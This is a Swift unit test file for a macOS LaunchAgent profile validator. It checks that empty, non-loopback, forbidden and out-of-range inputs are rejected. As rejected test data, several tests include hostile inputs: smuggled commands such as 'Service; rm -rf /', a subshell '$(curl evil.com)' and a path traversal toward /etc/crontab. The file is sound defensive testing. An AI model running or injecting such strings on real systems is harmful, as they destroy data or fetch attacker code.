import XCTest
@testable import OrquestradorLocal

final class ProfileValidatorTests: XCTestCase {

    private var plistURL: URL!
    private var ownsPlist = false

    override func setUpWithError() throws {
        plistURL = FileManager.default.homeDirectoryForCurrentUser
            .appendingPathComponent("Library/LaunchAgents/local.orquestrador.unit.\(UUID().uuidString).plist")
        XCTAssertFalse(FileManager.default.fileExists(atPath: plistURL.path), "Refusing to overwrite a pre-existing LaunchAgent")
        let plist: [String: Any] = [
            "Label": "local.teste.servico",
            "ProgramArguments": ["/bin/sh"],
            "WorkingDirectory": "/tmp",
            "RunAtLoad": false
        ]
        let data = try PropertyListSerialization.data(
            fromPropertyList: plist,
            format: .xml,
            options: 0
        )
        try data.write(to: plistURL, options: .atomic)
        ownsPlist = true
    }

    override func tearDownWithError() throws {
        if ownsPlist && FileManager.default.fileExists(atPath: plistURL.path) {
            try FileManager.default.removeItem(at: plistURL)
        }
    }

    private func baseInput() -> ProfileValidator.RawInput {
        ProfileValidator.RawInput(
            name: "Teste",
            label: "local.teste.servico",
            launchdDomain: .gui,
            plistPath: plistURL.path,
            executablePath: "/bin/sh",
            workingDirectory: "/tmp",
            readinessURLString: "http://127.0.0.1:19765/health",
            readinessIdentityKind: .bodyContains,
            readinessIdentityValue: "fixture-ready",
            activityURLString: "",
            openURLString: "http://127.0.0.1:19765/",
            readinessTimeoutSeconds: 30,
            stopTimeoutSeconds: 15
        )
    }

    // T01-A: Valid profile accepted
    func testValidProfileAccepted() throws {
        var input = baseInput()
        input.executablePath = "/bin/sh"
        let profile = try ProfileValidator.validate(input)
        XCTAssertEqual(profile.name, "Teste")
        XCTAssertEqual(profile.label, "local.teste.servico")
        XCTAssertEqual(profile.schemaVersion, ServiceProfile.currentSchemaVersion)
    }

    // T01-B: Empty name rejected
    func testEmptyNameRejected() {
        var input = baseInput()
        input.name = "   "
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.emptyField(let f) = error else {
                return XCTFail("Wrong error type: \(error)")
            }
            XCTAssertEqual(f, "nome")
        }
    }

    // T01-C: Missing label rejected
    func testEmptyLabelRejected() {
        var input = baseInput()
        input.label = ""
        XCTAssertThrowsError(try ProfileValidator.validate(input))
    }

    // T01-D: Label with invalid chars rejected
    func testInvalidLabelCharsRejected() {
        var input = baseInput()
        input.label = "local/hack;rm -rf"
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.injectionAttempt = error else {
                return XCTFail("Expected injectionAttempt, got: \(error)")
            }
        }
    }

    // T01-E: Non-existent executable rejected
    func testNonExistentExecutableRejected() {
        var input = baseInput()
        input.executablePath = "/nonexistent/binary/that/does/not/exist"
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.pathNotFound = error else {
                return XCTFail("Expected pathNotFound, got: \(error)")
            }
        }
    }

    // T01-F: Non-loopback URL rejected
    func testNonLoopbackURLRejected() {
        var input = baseInput()
        input.readinessURLString = "http://192.168.1.1:8765/health"
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.nonLoopbackURL = error else {
                return XCTFail("Expected nonLoopbackURL, got: \(error)")
            }
        }
    }

    // T01-G: Shell injection in name rejected
    func testShellInjectionInNameRejected() {
        var input = baseInput()
        input.name = "Service; rm -rf /"
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.injectionAttempt = error else {
                return XCTFail("Expected injectionAttempt, got: \(error)")
            }
        }
    }

    // T01-H: Path traversal in plist path rejected
    func testPathTraversalRejected() {
        var input = baseInput()
        input.plistPath = "/Users/joaopaulo/../etc/crontab"
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.injectionAttempt = error else {
                return XCTFail("Expected injectionAttempt, got: \(error)")
            }
        }
    }

    // T01-I: Forbidden label rejected
    func testForbiddenLabelRejected() {
        var input = baseInput()
        input.label = "com.apple.launchd"
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.labelNotAllowed = error else {
                return XCTFail("Expected labelNotAllowed, got: \(error)")
            }
        }
    }

    // T01-J: Timeout out of range rejected
    func testTimeoutOutOfRangeRejected() {
        var input = baseInput()
        input.readinessTimeoutSeconds = 1  // below minimum of 5
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.timeoutOutOfRange = error else {
                return XCTFail("Expected timeoutOutOfRange, got: \(error)")
            }
        }
    }

    // T13: Metacharacter injection blocked
    func testSubshellInjectionBlocked() {
        var input = baseInput()
        input.name = "$(curl evil.com)"
        XCTAssertThrowsError(try ProfileValidator.validate(input)) { error in
            guard case ProfileValidator.ValidationError.injectionAttempt = error else {
                return XCTFail("Expected injectionAttempt, got: \(error)")
            }
        }
    }
}
